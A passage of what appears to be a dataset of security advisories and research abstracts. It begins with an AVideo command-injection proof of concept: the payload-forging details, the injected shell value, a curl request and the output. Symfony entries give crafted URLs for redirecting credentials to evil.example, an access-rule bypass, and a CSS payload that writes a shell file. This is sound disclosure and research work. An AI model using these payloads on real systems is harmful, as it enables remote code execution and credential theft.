Reached by sending a `codeToExec` payload with either `list = 1` and a malicious `keyword`, or with a malicious `isKeywordRunning` value. Both modes call `listFFmpegProcesses()` with the raw field before any allowlist is applied to it.

### Privilege required

Same trust boundary as the parent command-injection fix in this endpoint: an attacker who can craft a valid encrypted `codeToExec` payload with a valid `APISecret`. `_decryptString()` calls the platform `decryptString` API (AES-256-CBC; key = `hash('sha256', $global['saltV2'])`, iv = `substr(hash('sha256', $global['systemRootPath']), 0, 16)`), and the payload is accepted when `payload->time` is within the last 30 seconds. No interactive login is required.

'API')`.

A `codeToExec` was encrypted (`encryptString()`) with:
- `time` = now
- `list` = 1
- `keyword` = `x'; touch /tmp/avideo_kw_rce_1782909694_20509 #`

POST:

```
curl -s -X POST "http://<host>/plugin/API/standAlone/ffmpeg.json.php" \
  --data-urlencode "APISecret=<APISecret>" \
  --data-urlencode "codeToExecEncrypted=<encrypted codeToExec>"
```

Verbatim response (normal list output while the injection ran as a side effect):

```
{"error":false,"msg":"","list":[]}
```

The injected `touch` ran (marker created by the web-server user):

```
-rw-r--r-- 1 www-data www-data 0 Jul  1 12:41 /tmp/avideo_kw_rce_1782909694_20509
```

Same result through the `isKeywordRunning` mode (payload `x'; touch /tmp/avideo_ikr_rce_1782909715_3303 #`):

```
{"error":true,"msg":"No FFmpeg process found with the given keyword","isRunning":false,"keyword":"x'; touch /tmp/avideo_ikr_rce_1782909715_3303 #"}
-rw-r--r-- 1 www-data www-data 0 Jul

items.summary:
When Request::getBaseUrl() does not find the script name at the start of the request URI, it looks for it further into the path. This supports web servers that rewrite every URL to a front controller in a subdirectory. The base URL then kept everything before the script name, and the client chooses that part. A request URI starting with // or /\ made the base URL start with a host.

With SCRIPT_NAME=/public/index.php, a request for //evil.example/public/index.php/login is routed to /login, with the base URL //evil.example/public/index.php and the base path //evil.example/public. The URLs generated for that page then point to evil.example:
- links built with path() and the actions of forms, so a login form sends the credentials of the user to evil.example;
- redirects to generated URLs, such as the ones of redirectToRoute();
- assets referenced with a relative path through asset(), so the page can load scripts from evil.example.

The attacker has to make a user follow a crafted link, such as https://app.example//evil.example/public/index.php/login. framework.trusted_hosts does not help, since the host of the request is the real one.

Applications are affected when their front controller is in a subdirectory and the web server sends it URIs that do not start with that directory. A .htaccess file at the root of the project that rewrites every URL to public/ does that, for instance.

Applications are also affected when the web server sets SCRIPT_NAME to the path of the request. Some nginx configurations do that when they send every request to the front controller without fastcgi_split_path_info. php -S does it too, with a router script outside the document root. A request for /\evil.example/index.php then gets the base URL /\evil.example/index.php, which browsers read as a link to evil.example.

The configurations recommended in the Symfony documentation are not affected.

Request::getBaseUrl() now returns an empty base URL when the request URI starts with // or /\.

items.summary:
Since the fix for CVE-2025-64500, Request::getPathInfo() strips the script name from the start of the URL. It does so even when the script name is only the start of a longer path segment. With SCRIPT_NAME set to /index.php, a request to /index.phpadmin gets the path info /admin and is routed like /admin. Encoded spellings such as /index%2Ephpadmin or /%69ndex.phpadmin work too. Before that fix, the path info was admin, which no route matched.

Rules enforced by Symfony are not affected: access_control and firewalls read the same path info as the router. Rules enforced in front of PHP are. The nginx configuration of the Symfony documentation and the .htaccess file of symfony/apache-pack make /index.php/admin unreachable, but they pass /index.phpadmin to the front controller. So a location /admin block in nginx, a <Location /admin> section in Apache, or a CDN or WAF rule on /admin can be bypassed.

The script name is now stripped only when it is followed by /, ? or the end of the URL. A request to /index.phpadmin gets the path info /index.phpadmin.

items.summary: Linearized Reed-Solomon codes (LRS) are optimal sum-rank-metric codes that generalize both Reed-Solomon and Gabidulin codes, and benefit from excellent decoding capabilities, making them potentially interesting candidates for post-quantum code-based cryptography. Previous works have investigated the underlying geometric structure of LRS codes, identifying geometric invariants that distinguish them from random codes. Other works have proposed approaches to recovering the LRS structure from an arbitrary generator matrix, together with additional data. However, both the distinguishers and the recovery techniques proposed so far are either not fully general, or have a prohibitive computational complexity. In this paper, we propose a polynomial-time procedure for the full structure recovery of LRS codes from the sole knowledge of an arbitrary generator matrix. Our results show that, like their Hamming and rank metric counterparts, LRS codes cannot be used as they are for McEliece-like encryption. Our approach combines Overbeck-type attacks with suitable matrix manipulations and shortening techniques to recover the evaluation parameters across different ranges of code dimensions.
items.title: Full Structure Recovery of Linearized Reed-Solomon Codes

items.summary: With the increasing adoption of privacy-preserving techniques in dynamic graph analysis, local differential privacy (LDP) has become a fundamental paradigm for protecting user data in decentralized environments. However, despite its strong privacy guarantees, LDP-based dynamic graph protocols remain vulnerable to data poisoning attacks through malicious data injection. In this paper, we present the first systematic study of data poisoning attacks against privacy-preserving dynamic graphs under the LDP framework. Considering the temporal evolution of dynamic graphs, we identify key challenges in attack design and evaluation, including how to schedule attack resources across time and how to measure cumulative attack impact. To address these challenges, we introduce an absolute gain metric to quantify the overall deviation of graph statistical metrics before and after attacks across time. Based on this metric, we further propose a unified poisoning attack framework for dynamic graphs, which consists of target node selection, dynamic fake node scale scheduling, and fake edge injection. Within this framework, we design a temporal enhanced attack (TEA) strategy that dynamically schedules attack resources to maximize attack effectiveness, along with two baseline strategies, equal-scale attack (ESA) and random-scale attack (RSA), for comparison. Extensive experiments on real-world and synthetic datasets demonstrate that the proposed attacks can significantly degrade the accuracy of graph metric estimation for target nodes.
items.title: Poisoning Attacks to Local Differential Privacy Protocols for Dynamic Graphs

items.summary: Advances in quantum computing pose a long-term threat to blockchain systems that rely on classical digital signature schemes such as ECDSA. Migrating these systems to post-quantum cryptography introduces practical costs beyond cryptographic security, including larger transactions, higher computational costs and faster ledger growth. We present an empirical evaluation of 13 signature configurations in a common simulated blockchain framework: ECDSA, ML-DSA-44/65/87, Falcon-512/1024, SLH-DSA-SHA2-128s, and six hybrids combining ECDSA with each post-quantum scheme. We measure signing and verification costs, transaction-processing throughput, and signature and public-key sizes, and project the measured overheads onto five public blockchains: Bitcoin, Ethereum, Solana, BNB Smart Chain and TRON. Verification remains inexpensive for the evaluated lattice-based schemes, with Falcon-512 achieving a verification time comparable to ECDSA (30.1 versus 32.8 $μ$s). Storage overheads, however, are substantial. Under our modelling assumptions, had the recorded transaction histories used Falcon-512, the most compact post-quantum scheme evaluated, ledger sizes would have been 79--229% larger, depending on the blockchain. Hybrid configurations introduce relatively modest additional storage overhead compared with their standalone post-quantum counterparts, while ECDSA+Falcon-512 approximately doubles the verification cost of standalone Falcon-512. Existing transaction- and script-size limits also present obstacles to straightforward migration in Bitcoin and Solana. Overall, our findings suggest that storage overhead may pose a greater challenge than signature verification costs when migrating blockchain systems to post-quantum cryptography.
items.title: Evaluating Post-Quantum and Hybrid Signatures for Blockchains: Performance, Storage and Ledger Growth

items.summary: Node-differentially private algorithms enable learning on network-structured datasets in which records reflect interactions among individuals. They protect the privacy of each individual's information, including all their associated records. A key challenge in the design of such algorithms is to exploit the structure of realistic graphs---where most nodes have low degree---to achieve high accuracy, without compromising on the worst-case privacy guarantee. In this work we give two new tools for designing accurate, computationally efficient node-differentially private algorithms. First, we give a nearly linear time, randomized, node-stable graph projection: the projection leaves graphs of maximum degree $D$ unchanged, maps arbitrary graphs to subgraphs of maximum degree $\hat D \approx D$, and ensures that changing one node of the input graph has only a small effect on the distribution of the edges selected among the remaining vertices. Unlike prior approaches, which abstain when the input violates the degree bound, our projection acts as degree clipping: even when $D$ is set well below the true maximum degree (trading truncation bias at high-degree outliers for lower privacy noise), it retains at least as many edges as a maximal $D$-bounded subgraph. Second, for graphs with bounded edge weights, we give a deterministic nearly linear time Lipschitz extension for the total edge weight that agrees with the original sum on graphs of maximum degree $D$ yet is $D$-Lipschitz on all graphs. Finally, we show how to apply these methods to design node-private algorithms for high-dimensional vector summation and gradient descent on datasets where records are associated with graph edges, such as email threads.

items.summary: AI coding agents increasingly write and submit code with limited human review, and much of it passes functional tests while remaining insecure. We show that these failures persist. Across 14 task sequences, Codex, Claude Code, and Qwen Code fixed a vulnerability 85.7% of the time when shown the failing security test, then reintroduced the same vulnerability class in a new session 26.7% of the time, about as often as agents that had never seen it (27.5%). The capability is present; the retention is not. Neither recording the repair in the agent's persistent context nor supplying published secure coding principles closed the gap: the recorded fix stayed tied to the family of the task it came from, and the principles, written for human developers, remained too general to apply to the code at hand. The knowledge exists; it is not activated. We call the missing ability security self-improvement: an agent learns from its own security failures so that each lesson persists across sessions, applies to new code, and does not break what works. We present PRECEPT, which equips coding agents with this ability through an evolving library that starts from authoritative secure coding principles and revises them against the agent's own failures, so that each principle comes to fire on the code where that agent actually goes wrong. A revision is kept only if fresh executions show it makes code more secure while keeping functional success within a small tolerance of the agent without the library. Improvement continues across evolution steps rather than saturating after the first. On task families never seen during evolution, PRECEPT's weakest agent reaches 97.1% secure working code, above the strongest unaided agent at 81.9% and the strongest baseline at 87.7%.
items.title: PRECEPT: Security Self-Improvement of Coding Agents via Evolving Principles

items.summary: Business commitments require accepted terms to be linked to delegated authority, reserved resources and durable evidence. We examine how a shared, attributable interaction record can support these links across independently operated organisations. Talea combines signed AT Protocol records with A2A task execution. We use its coordination sandbox and a proposed commercial extension in a design study of an airline booking disrupted passengers into three competing hotels. Four observations follow. First, AT Protocol provides mechanisms supporting five of six coordination requirements, while record-level access and release controls require additional enforcement. Second, the case's confidentiality constraints restrict each hotel's authorised view to its bilateral exchange; only the airline can correlate all three deals. Third, this leaves a possible benefit for late-joining participants inside the airline's trust boundary, but does not establish an advantage over an equally instrumented point-to-point design. Fourth, a deterministic release interface constrains fixed, approved payloads but cannot bound disclosure when negotiated values depend on private state. Finite-model explorations and deterministic interface checks reproduce the specified behaviours and counterexamples when selected controls are removed. They do not measure comparative benefit or validate a deployed commercial system. The remaining hypothesis is that, within one trust boundary, shared records improve decision reconstruction and recovery under changing participation relative to point-to-point exchange with equivalent authority, reservation, retention and correlation evidence. We specify an experiment to test it.
items.title: From Conversations to Commitments: A Design Study of Shared Records for Agent-to-Business Coordination

items.summary: AI models are increasingly being deployed at the edge. Since these models often require significant research and development to produce, are often deployed in potentially hostile environments, and downstream systems often rely on accurate data; protecting them from theft or manipulation is worthy of serious consideration. Trusted Execution Environments (TEEs), which provide hardware-enforced separation of software execution, can protect model weights but impose strict resource constraints, making full-model execution impractical for large neural networks. We present Onnx2TEE, an automated, model-independent pipeline that partitions ONNX models across rich, trusted execution environments for non-sequential feed-forward networks using graph-aware segmentation to preserve computational dependencies while minimizing boundary communication and reducing TEE-induced inference latency. Evaluation on an NVIDIA Jetson AGX Orin using an Arm TrustZone TEE demonstrates that model parameters can be highly concentrated in individual segments, supporting selective protection of parameter-dense model components. The evaluation further shows that the generated trusted app's memory requirements depend on both computation and intermediate tensor sizes.
items.title: Onnx2TEE: Automated Graph-Aware Model Partitioning for TEE-based Edge AI Protection

items.summary: PHP powers most of the web, yet its C interpreter has had many memory-safety vulnerabilities. Reimplementing the interpreter in safe Rust offers a promising way to eliminate these vulnerabilities. However, eliminating native memory violations alone does not necessarily prevent unintended accesses to the logical memory of the translated program. To prevent such failures, we introduce logical memory safety, which confines the program operations to their permitted memory. In this paper, we formalize this property for PHP through an abstract PHP machine model that captures how the PHP interpreter manages program values while abstracting away functionality details. Guided by this model, we reimplement the PHP 5.0.0 engine in safe Rust, and formally prove that, for a core fragment of PHP, our Rust translation refines the abstract PHP machine, thereby establishing logical memory safety for this fragment. Our translation safely handles all 173 memory vulnerabilities we collected that affect PHP 5.0.0 prior to the rewrite. The Rust version matches the C implementation on all functionality tests, and produces identical outputs for the real-world PHP applications we evaluate. To our knowledge, this is the first principled safe Rust port of a core fragment of the PHP interpreter that combines formal guarantees of logical memory safety with functional compatibility. The improved security comes at a modest average runtime overhead of only 15% compared to C.
items.title: A Star is Reborn: The PHP Interpreter Rewritten in Safe Rust

items.summary: Wireless communication networks are expanding from mere information transfer to sensing: in the Integrated Sensing and Communication paradigm, existing infrastructure and signals are reused to capture physical information about the surroundings of devices, envisioned to inform high-stakes applications such as healthcare and autonomous vehicles. From a security perspective, wireless sensing inherently trusts physical observations of the radio environment. However, as in wireless communication, the open nature of radio propagation allows attackers to tamper with victim signals. In particular, attackers can use programmable metasurfaces to manipulate wireless channels and thereby mislead sensing systems. Yet, prior metasurface-based manipulations target only individual channel features such as variance or Doppler shifts. Thus, they require knowledge of the victim sensing system and produce implausible channels that are easy to detect. In this work, we show that metasurfaces enable physically plausible manipulation of wireless sensing that is independent of the features used by the victim sensing system. Our attack reproduces genuine pre-recorded events at the physical layer and thereby synthesizes physical deepfakes of wireless channels. To this end, we develop an attack framework that controls the amplitude and phase of victim channels across time, frequency, and antennas. The key challenge here is to build a deep learning model of the interaction between metasurface and victim channel. We demonstrate that attackers can solve this challenge in several settings, e.g., by exploiting Wi-Fi Beamforming Feedback Information or replicating the victim environment. We validate the attack both in a controlled lab study on MIMO channels and with off-the-shelf Wi-Fi sensing. Our results fundamentally challenge the trustworthiness of wireless sensing.
items.title: Spoofing Wireless Sensing with Metasurface-based Physical Deepfakes

items.summary: The spread of fake news among Arabic media including social media represents a great challenge to the integrity of information and the trust of the public in it. In this paper, we introduce a comprehensive deep-learning framework, named ArabFake, that goes beyond the binary classification on Arabic fake news detection. ArabFake, built over MARBERTv2 (a state-of-the-art model for multi-dialectal Arabic tweets), proficiently address the complexity of the Arabic language while performing three unified tasks which are fake news detection, content categorization and its risk assessment. The framework promotes efficiency and performance both by enabling multi-task learning through shared knowledge representation across tasks. In order to facilitate development and evaluation, we present the ArabFake Dataset consisting of 2,495 manually labelled news items with labels that are verified by experts regarding fake news categories and risk levels. We improve interpretability and extract insight into manipulative techniques by integrating valence scoring as part of the framework that emphasizes misleading linguistic cues used to disseminate fake news within the produced image. The results show that ArabFake is a holistic Arabic fake news detection framework that has practical implications on news organizations and fact checking projects.

items.summary: Long-lived secure channels for embedded and cyber-physical systems (CPSs) must resist quantum attacks and failures in endpoint randomness. While several post-quantum key exchange protocols exist, their security assumes reliable randomness at the endpoint, but this assumption is not always true in embedded devices. In this paper, we introduce the Entropy Attack Suite (EAS) to evaluate secure channels facing endpoint randomness failures, such as low-entropy boot and Random Number Generation (RNG) path subversion. As a case study, we design and implement APQKE-DR, a post-quantum secure channel. Its handshake uses ML-KEM [1] and ML-DSA [2], producing a root key for an X25519 Double Ratchet. We assess the performance of APQKE-DR and security for smart grid communication, and integrate it beneath ANSI C12.22 and DNP3 without altering payload formats. On a Raspberry Pi Compute Module 5, the APQKE handshake exchanges 9,610 bytes with median latencies of 1.99 ms (node) and 0.82 ms (server). The ratcheted channel adds 31 bytes per message. With fresh randomness and ideal cryptographic primitives, ProVerif verifies the modeled secrecy and authentication properties. If randomness fails, EAS can recover the RNG stream and root key from public transcripts. Under RNG-path subversion, a weak generator exposes the root key across sessions. If subversion also affects X25519 keys, attackers may access ratchet keys and plaintexts. TPM seeding prevents early-boot attacks but not later subversion, while measured boot can block modified firmware. Secure deployment thus requires integrity along the entire entropy path, not just strong cryptographic primitives.
items.title: APQKE-DR: Entropy-Failure Analysis of a Post-Quantum-Initialized Ratcheted Channel

items.summary: AI audits have garnered significant attention in recent months, as the ability to test and monitor AI models plays a crucial role in safe development and deployment. However, AI audit success hinges on an auditor's authority; in particular, what information and resources they have at their disposal. Ongoing debates have surrounded the question: How much model access is needed to conduct an AI audit? Auditors seek more model access, while companies resist it for reasons related to confidential business information (trade secrets) and privacy. This tug-of-war remains unresolved. Further, this debate misses a related question: How much data and compute do auditors need? In this work, we systematically investigate both questions. We provide a framework that varies each of these three dimensions-model access, data, and compute-and measures their joint effect on audit success. We apply this framework to three tasks. We find that (1) some model access is important, but there can be diminishing returns; (2) data and compute matter more for traditional fairness audits, but model access matters more for manipulation and lie detection; and (3) these three resources can be fungible (i.e., an exchange rate exists between them), meaning that model access is not the only salient factor. These results suggest that audit governance should jointly consider different dimensions of auditor authority (including model access, data, and compute) in relation to audit objectives. These issues are particularly salient as we consider the spectrum of auditing setups, from a small ecosystem of embedded evaluators with significant access to a large body of third-party auditors with greater independence but limited access. Our framework serves as a template that can be applied to different audit tasks and inform the degree of auditor authority.
items.title: Audits Need Access, Data, and Compute. But How Much?

items.summary: While malware on platforms such as Windows and Android has been extensively studied, the macOS ecosystem remains comparatively understudied. To address this gap, we present MALET, a large-scale public dataset for macOS malware analysis. MALET contains 44{,}804 malicious Mach-O binaries and 44{,}457 samples with zero antivirus detections on VirusTotal. From the undetected set, we further identify 25{,}835 high-confidence benign samples using conservative, heuristic-based filtering. We also introduce Katalina, an open-source static analysis framework that extracts macOS-specific structural features and indicators of potential behavior at scale. Using MALET, we perform, to the best of our knowledge, the first large-scale static characterization of macOS malware. Our analysis reveals macOS-specific traits, including widespread misuse of security entitlements, abuse of native scripting interfaces, and irregularities in code-signing infrastructure. We find that 93.0\% of malicious samples are unsigned, demonstrating that unsigned code continues to execute in practice through user-mediated approval mechanisms. Among CA-signed malware, 28.4\% (816 samples) were associated with certificates that were later revoked, including samples publicly attributed to DPRK-linked threat actors, as reflected in antivirus labels and threat intelligence reports. Finally, we identify significant detection instability: in 185 structurally identical malicious samples, antivirus engines failed to provide consistent detections for 77.2\% (143 samples). Together, these results highlight persistent blind spots in macOS malware detection and motivate improved approaches to certificate abuse analysis, similarity-based clustering, and platform-specific defense mechanisms. Based on these insights, we outline concrete steps to advance the state of macOS malware analysis and defense.
items.title: MALET & Katalina: A Large-Scale Dataset and Static Analysis of macOS Malware

items.summary: Hyperdimensional computing (HDC) models deployed on edge hardware are valuable intellectual property that is easy to steal, since a trained classifier consolidates its learned knowledge into a compact set of class prototype hypervectors; yet protecting their ownership through watermarking remains largely unexplored. We present HDMark, the first model watermarking framework native to HDC, which encodes ownership in the same hyperdimensional algebra the model computes with. HDMark maps a multi-bit owner identity to secret quasi-orthogonal carriers, superimposes them holographically onto the trained class prototypes, and verifies ownership with a statistical test. Across four datasets and three HDC learning rules, HDMark leaves accuracy essentially unchanged and verifies a 64-bit identity in 99.8% of trials at p < 0.001. We derive closed-form expressions for prediction fidelity and bit recovery that match measurements within 0.4 pp mean absolute error. The watermark survives fine-tuning and low-bit quantization, while attempting to erase it through noise injection, pruning, or overwriting severely degrades model accuracy. We further identify a dimension-permutation attack specific to HDC, which reorders hypervector coordinates to evade verification without altering predictions, and counter it through encoder realignment. Finally, an AMD ZCU104 FPGA implementation confirms that HDMark adds no hardware overhead, remains bit-exact under aggressive undervolting, and stays verifiable under timing faults until the classifier itself fails.
items.title: HDMark: Holographic Multi-Bit Model Watermarking for Intellectual Property Protection in Hyperdimensional Computing

items.summary: Apple ships hundreds of task-specific machine-learning models inside iOS, iPadOS, macOS, and tvOS. We present, to our knowledge, the first systematic security analysis of this on-device surface. We harvested 1,137 CoreML artifacts from six platform images and two device harvests, and a conversion pipeline recovered 155 previously opaque bundles as loadable mlpackage archives. Eight findings. (1) 368 of 1,137 artifacts expose plaintext learned parameters (281 blobs, 369.61 MiB) and 166 of 166 MIL bundles leak internal model-database tokens. (2) Specification versions 1-9 coexist and locale variants diverge architecturally. (3) Across 82,092 adversarial evaluations (221 model paths), worst-case flip rates reach 100%; zero-width spaces flip 65% of the Indian-English and 70% of the US-English SMS filter. (4) A 16-byte weight edit flips 7 of 8 probe inputs of a system model, with no runtime integrity check observed. (5) Loading Apple's own hand-gesture model crashes libBNNS through the public CoreML API (4/4 on production M2, also macOS 27.0); Apple ruled it a self-crash outside the security boundary. (6) Eleven bundles ship isUpdatable=1 hooks. (7) SMS text-classifier latency is 13.1-52.0 ms, 92.4% in the CPU-side NLP core, not the ANE. (8) The classifiers label 8-9 of 10 phishing messages Transactional. We filed three reports with Apple Product; all were declined as not crossing a security boundary, and we report the findings as robustness results.

items.summary: Black-box integrity verification aims to detect unauthorized modifications to outsourced models using only prediction APIs. Existing frameworks seek to improve verification efficiency through sensitive fingerprints: queries whose predictions are more likely to change under tampering than those of genuine inputs. We show that this sensitivity can also help dishonest providers recognize verification queries and selectively conceal tampering. We prove that excess sensitivity relative to genuine inputs lower-bounds statistical distinguishability. We evaluate five integrity verification frameworks across three model architectures, three datasets, and three adversarial knowledge settings. When the deployed framework is known, our fingerprint detectors achieve AUCs at least 0.989, and selective filtering makes all five frameworks require significantly larger estimated query budgets than genuine inputs, reversing their intended efficiency advantage. A query-efficiency advantage remains marginally in a small subset of evaluated settings with poor detection transfer. We further design verification methods under stronger concealment constraints but find that reduced detectability comes with losses in sensitivity or fingerprint-generation success. Our results expose a sensitivity-detectability tension and show that sensitivity alone does not ensure efficient black-box verification against adaptive malicious providers.
items.title: The Fingerprinting Paradox: Why Sensitivity Undermines Black-Box Model Integrity Verification

items.summary: We study how to represent and randomize points in $d$-dimensional Euclidean space to obtain accurate bipartite matchings under metric privacy. Given $n$ private and $n$ public points, we analyze local mechanisms that randomize each private point or its distances to the public points. Using the public points' affine span, we construct a smaller representation that preserves all matching costs. When a trusted server receives the private points, we establish privacy and utility guarantees for Gumbel matching, which randomizes edge costs and releases only the assignment. Through upper bounds and worst-case constructions, we establish the tight rate $Θ\!\left(n\min\{d,\log n\}/\varepsilon\right)$ for expected cost above the nonprivate optimum. Benchmark experiments support $d\approx\log n$ as a practical guide to the transition between directly randomizing point coordinates and using Gumbel matching. Extensions to squared Euclidean costs enable private nonparametric two-sample hypothesis testing. These results show how the application's trust model guides representation and dimension choices for better utility: under local privacy, low-dimensional point representations reduce excess cost, while under central privacy, distance representations achieve the optimal rate even in high dimension.
items.title: Matching Under Metric Privacy

items.summary:
Most methods of Symfony\Component\Filesystem\Path rely on Path::split(), which takes everything before the first :// as the root of a path. It doesn't check that this prefix is a URI scheme, so the .. segments in that prefix are never resolved. PHP sees a scheme only at the start of a string. So /base/../x://../secret.txt is a plain local path to /secret.txt for PHP, while Path::isBasePath('/base', '/base/../x://../secret.txt') returns true. canonicalize(), join(), makeAbsolute() and makeRelative() are affected the same way.

Some applications check a path built from user input with isBasePath() or canonicalize(), and then open it. They can be made to read or write files outside the expected directory.

On Symfony 6.4 and later, the AssetMapper component builds with Path::join() the path of the files that a remote package references from its CSS. A malicious or compromised package can therefore make importmap:require or importmap:install write a file of its choice outside assets/vendor. For example, the CSS url(../../../../../public/x://shell.php) writes public/x:/shell.php.

A prefix is now a scheme only when PHP would look for a stream wrapper with that name. That is two or more letters, digits, +, - or ., followed by :// at the start of the path. Other prefixes are regular path segments, and the .. segments after them are resolved. Real schemes such as phar://, file://, vfs:// or compress.zlib:// keep working.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

Bluetooth: L2CAP: Reject invalid TxWindow in configuration requests

A peer can send an ERTM RFC option with a TxWindow
of zero, which is out of spec. It is stored in
remote_tx_win unchanged and later passed to
l2cap_seq_list_init(), where roundup_pow_of_two(0)
is undefined. On some architectures this results in
a ZERO_SIZE_PTR list and a remote kernel oops.

A TxWindow above 63 is out of spec as well. With
6-bit sequence numbers we would then send more
unacknowledged frames than the sequence space can
tell apart.

Reply with L2CAP_CONF_UNACCEPT and propose the
default TxWindow instead of accepting the value, so
remote_tx_win always stays within 1 to 63. Keep the
parameters of an earlier request then, and do not
treat the request as done because an earlier one was.

Also refuse a zero size in l2cap_seq_list_init(), so
any other path that reaches it with a zero TxWindow
fails the channel instead of the kernel.

items.summary:
In Eclipse Ditto versions 1.1.0 to 3.9.9, the nginx reverse proxy configurations shipped with Ditto (Helm chart, Docker Compose, Kubernetes and OpenShift deployment files) forward a client-supplied

  `x-ditto-pre-authenticated` header to the Ditto gateway on locations that do not apply nginx authentication, such as `/api/2/connections`. nginx selects the location based on the normalized request URI
  but forwards the raw URI, while the gateway does not treat an encoded slash (`%2f`) as a path separator. A crafted request path is therefore routed by nginx through such an unauthenticated location and
  by the gateway to the regular Things and Policies HTTP API, including routes that send live messages to devices. When pre-authentication is enabled (the default of the Helm chart and the Docker Compose
  setup), an unauthenticated remote attacker can impersonate arbitrary policy subjects and read, modify and delete Things, read Policies, send messages to devices and create entities. Additionally, the
  optional Ingress of the Helm chart (Ditto 3.9.0 to 3.9.9) routes requests directly to the gateway without setting or removing that header, and the WebSocket Ingress of the Helm chart of Ditto 3.3.0 to
  3.8.15 does not set it, allowing the same impersonation without path manipulation when pre-authentication is enabled. This bypasses the fix for CVE-2026-120753.

The default /_components/{_live_component}/{_live_action} route still served the component, though. The request needs props signed by the application, which a page that rendered the component provides. Controller attributes on the component, like #[IsGranted], still applied.

A live component is now only served by the route it is configured with.

items.summary: A protection mechanism failure in the userspace firewall of the NetBird client (client/firewall/uspfilter) in NetBird versions 0.55.0 through 0.74.6 allows an attacker who controls an enrolled peer to bypass the access control rules of another peer by sending IP-fragmented packets. The packet filter returned an allow verdict for any IPv4 fragment, and for any IPv6 packet carrying a Fragment extension header, before evaluating the ACL rules. This applied to the leading fragment as well as to continuation fragments, so no part of a fragmented datagram was filtered and ports denied by policy could be reached. The userspace filter is the packet filter wherever the client does not program the kernel firewall, which includes the Android and iOS apps. The issue is fixed in version 0.74.7, in the Android app from version 0.6.0 and in the iOS app from version 0.3.3, which evaluate fragments against the same ACL rules as unfragmented packets.
